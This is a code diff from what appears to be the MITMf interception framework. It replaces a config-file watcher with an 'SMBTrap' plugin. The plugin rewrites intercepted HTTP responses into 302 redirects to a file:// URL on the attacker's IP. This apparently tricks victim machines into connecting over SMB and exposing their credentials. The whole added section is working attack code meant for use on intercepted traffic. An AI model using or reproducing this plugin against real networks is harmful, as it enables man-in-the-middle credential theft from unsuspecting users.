@@ -1,5 +1,3 @@
-#!/usr/bin/env python2.7
-
 # Copyright (c) 2014-2016 Marcello Salvati
 #
 # This program is free software; you can redistribute it and/or
@@ -17,25 +15,24 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 #
+import random
+import string
 
-from mitmflib.watchdog.observers import Observer
-from mitmflib.watchdog.events import FileSystemEventHandler
-from configobj import ConfigObj
+from plugins.plugin import Plugin
 
-class ConfigWatcher(FileSystemEventHandler, object):
+class SMBTrap(Plugin):
+	name = "SMBTrap"
+	optname = "smbtrap"
+	desc = "Exploits the SMBTrap vulnerability on connected clients"
+	version = "1.0"
 
-    @property
-    def config(self):
-        return ConfigObj("./config/mitmf.conf")
+	def initialize(self, options):
+		self.ip = options.ip
 
-    def on_modified(self, event):
-        self.on_config_change()
+	def responsestatus(self, request, version, code, message):
+		return {"request": request, "version": version, "code": 302, "message": "Found"}
 
-    def start_config_watch(self):
-        observer = Observer()
-        observer.schedule(self, path='./config', recursive=False)
-        observer.start()
-
-    def on_config_change(self):
-        """ We can subclass this function to do stuff after the config file has been modified"""
-        pass
+	def responseheaders(self, response, request):
+		self.clientlog.info("Trapping request to {}".format(request.headers['host']))
+		rand_path = ''.join(random.sample(string.ascii_uppercase + string.digits, 8))
+		response.headers["Location"] = "file://{}/{}".format(self.ip, rand_path)
